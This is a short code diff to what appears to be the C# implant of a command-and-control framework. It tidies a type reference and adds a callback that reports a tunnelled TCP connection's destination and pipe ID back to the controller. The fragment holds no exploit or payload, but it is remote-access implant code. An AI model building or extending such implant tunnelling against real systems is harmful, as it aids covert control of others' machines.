@@ -35,7 +35,7 @@ namespace NuagesSharpImplant
             var host = Dns.GetHostEntry(Dns.GetHostName());
             foreach (var ip in host.AddressList)
             {
-                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
                 {
                     return ip.ToString();
                 }
@@ -725,6 +725,10 @@ namespace NuagesSharpImplant
                     throw new Exception("Could not connect to host");
                 }
             }
+            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+            list.Add(new KeyValuePair<string, JsonValue>("destination", tcpClient.Client.RemoteEndPoint.ToString()));
+            list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
+            this.Callback("pipe_dest", new JsonObject(list));
             connector.tcp2pipe(tcpClient, pipe_id);
             SubmitJobResult(jobId, "Tcp Connection Closed", false);
 
